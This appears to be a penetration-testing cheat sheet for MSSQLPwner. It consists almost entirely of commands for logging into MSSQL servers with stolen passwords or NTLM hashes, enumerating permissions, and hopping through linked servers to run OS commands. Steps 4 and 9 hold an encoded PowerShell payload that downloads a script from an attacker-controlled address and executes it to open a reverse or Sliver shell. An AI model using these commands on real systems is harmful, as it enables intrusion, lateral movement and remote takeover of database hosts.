# MSSQLPwner

### 1) Try and check permissions as different users - PTH and creds
   
    mssqlpwner domain.com/domainuser:8b1B0BzGvj9J@10.10.100.15 -windows-auth interactive enumerate
    mssqlpwner ./Administrator@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate
    mssqlpwner domain.com/machine01\$@10.10.100.15 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth interactive enumerate


### 2) For local authentication

    mssqlpwner localuser:password@10.10.200.130 interactive enumerate


### 3) Run command on the link

    mssqlpwner localuser:password@10.10.200.130 -link-name SQL01 exec hostname
    mssqlpwner localuser:password@10.10.200.130 -link-name SQL02 exec hostname
    mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec hostname
    mssqlpwner dev.domain.com/machine01\$@10.10.200.131 -hashes ':ffffffffffffffffffffffffffffffff' -windows-auth -link-name SQL04 exec hostname


### 4) Get reverse shell

    mssqlpwner localuser:password@10.10.200.130 -link-name SQL03 exec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='


### 5) Use specific link

    mssqlpwner -hashes ':ffffffffffffffffffffffffffffffff' ./Administrator@10.10.200.131 -windows-auth -link-name sql03 enumerate interactive


### 6) Get the chain list accessible

    get-chain-list


### 7) Set chain to that of dba access on a linked machine

    set-chain c99e9ea1-6f06-4f85-85b0-4b65d11d4a3a


### 8) Run command on the selected chain

    exec "whoami /all"


### 9) Sliver session

    exec 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
